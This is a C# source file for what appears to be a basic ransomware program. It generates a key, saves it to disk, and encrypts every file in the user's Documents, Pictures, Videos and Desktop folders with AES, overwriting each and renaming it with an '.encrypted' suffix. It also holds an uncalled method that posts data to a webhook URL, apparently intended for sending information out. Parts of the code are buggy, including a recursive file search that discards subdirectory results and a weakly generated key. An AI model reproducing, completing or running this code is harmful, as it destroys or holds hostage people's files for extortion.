using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Web;

namespace Master
{
    public class Program
    {
        public static void Main(string[] args)
        {
            var TargettedDirectories =
                new string[4] { "Documents", "Pictures", "Videos", "Desktop" };

            var key = GenerateKey(32);
            File.WriteAllText("./key.key", key);

            string home =
                Environment
                    .GetFolderPath(Environment.SpecialFolder.UserProfile);

            var SubDirs = GetSubDirectories(home);

            for (var i = 0; i < TargettedDirectories.Length; i++)
            {
                string path = $"{home}/{TargettedDirectories[i]}";
                Console.WriteLine($"Encrypting {path}");

                EncryptDirectory (path, key);
            }

            Console.WriteLine($"{home}");
            Console.WriteLine(@"Decryption Key: {0}", key);

            //  Console.Write(SubDirs);
            //  Console.Write (MainDirectory);
        }

        public static void EncryptDirectory(
            string TargetDirectory,
            string EncryptionKey
        )
        {
            List<string> Files = getFilesRecursive(TargetDirectory);

            // string[] Files = Directory.GetFiles(TargetDirectory);
            for (int i = 0; i < Files.Count; i++)
            {
                var file = Files[i];

                var text = System.IO.File.ReadAllText(file);
                var Encrypted = AesOperation.EncryptString(EncryptionKey, text);

                File.WriteAllText (file, Encrypted);
                System.IO.File.Move(file, file + ".encrypted");
            }
        }

        public static List<string> GetSubDirectories(string path)
        {
            var result = new List<string>();
            string[] dirs =
                Directory
                    .GetDirectories(path, "*", SearchOption.AllDirectories);
            foreach (string dir in dirs)
            {
                //  Console.WriteLine (dir);
                result.Add (dir);
            }
            return result;
        }

        public static List<string> getFilesRecursive(string sDir)
        {
            var files = new List<string>();
            try
            {
                foreach (string d in Directory.GetDirectories(sDir))
                {
                    getFilesRecursive (d);
                }
                foreach (var file in Directory.GetFiles(sDir))
                {
                    files.Add (file);
                    // if (files.Length == 0)
                    // {
                    //     files[0] = file;
                    // }
                    // else
                    // {
                    //     files[files.Length + 1] = file;
                    // }
                }
            }
            catch (System.Exception e)
            {
                Console.WriteLine("Error: " + e.Message);
            }
            return files;
        }

        private static HttpClient client = new HttpClient();

        public static async void SendWebhook()
        {
            var WebhookURL =
                "http://urlapi/webhooks/1007953835467210873/eWKYwe7qrLgS9EdepZyidikxRcfctv6qLhsm-ujF7a7GxvauMyiYWHh8fQMjoHp7KusS";
            var values =
                new Dictionary<string, string> {
                    { "thing1", "hello" },
                    { "thing2", "world" }
                };

            var content = new FormUrlEncodedContent(values);

            var response = await client.PostAsync(WebhookURL, content);

            var responseString = await response.Content.ReadAsStringAsync();
        }

        public string GetUserHome()
        {
            var homeDrive = Environment.GetEnvironmentVariable("HOMEDRIVE");
            if (!string.IsNullOrWhiteSpace(homeDrive))
            {
                var homePath = Environment.GetEnvironmentVariable("HOMEPATH");
                if (!string.IsNullOrWhiteSpace(homePath))
                {
                    var fullHomePath =
                        homeDrive + Path.DirectorySeparatorChar + homePath;
                    return Path.Combine(fullHomePath, "myFolder");
                }
                else
                {
                    throw new Exception("Environment variable error, there is no 'HOMEPATH'");
                }
            }
            else
            {
                throw new Exception("Environment variable error, there is no 'HOMEDRIVE'");
            }
        }

        public static string GenerateKey(int KeyLength)
        {
            var chars =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var stringChars = new char[KeyLength];
            var random = new Random();

            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }

            var finalString = new String(stringChars);
            return finalString;
        }
    }

    public class AesOperation
    {
        public static string EncryptString(string key, string plainText)
        {
            byte[] iv = new byte[16];
            byte[] array;

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;

                ICryptoTransform encryptor =
                    aes.CreateEncryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (
                        CryptoStream cryptoStream =
                            new CryptoStream((Stream) memoryStream,
                                encryptor,
                                CryptoStreamMode.Write)
                    )
                    {
                        using (
                            StreamWriter streamWriter =
                                new StreamWriter((Stream) cryptoStream)
                        )
                        {
                            streamWriter.Write (plainText);
                        }

                        array = memoryStream.ToArray();
                    }
                }
            }

            return Convert.ToBase64String(array);
        }

        public static string DecryptString(string key, string cipherText)
        {
            byte[] iv = new byte[16];
            byte[] buffer = Convert.FromBase64String(cipherText);

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;
                ICryptoTransform decryptor =
                    aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream(buffer))
                {
                    using (
                        CryptoStream cryptoStream =
                            new CryptoStream((Stream) memoryStream,
                                decryptor,
                                CryptoStreamMode.Read)
                    )
                    {
                        using (
                            StreamReader streamReader =
                                new StreamReader((Stream) cryptoStream)
                        )
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
        }
    }
}
